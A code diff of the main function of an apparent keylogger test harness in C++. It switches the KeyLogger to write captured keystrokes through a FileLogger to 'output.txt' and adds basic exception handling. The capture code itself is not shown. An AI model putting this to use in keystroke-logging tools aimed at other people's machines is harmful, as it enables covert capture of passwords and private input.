@@ -1,13 +1,21 @@
-// TestKeylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
-
 #include <iostream>
 #include "KeyLogger.h"
+#include "FileLogger.h"
 
 using namespace std;
 
 int main()
 {
-    KeyLogger logger("logfile.txt");
-	logger.StartLogging();
+	FileLogger* logger = new FileLogger("output.txt");
+    KeyLogger* keyLogger = new KeyLogger(logger);
+	
+	try {
+		keyLogger->StartLogging();
+	}
+	catch (exception) {
+		cout << "Exception received";
+	}
+
+	delete logger;
+	delete keyLogger;
 }
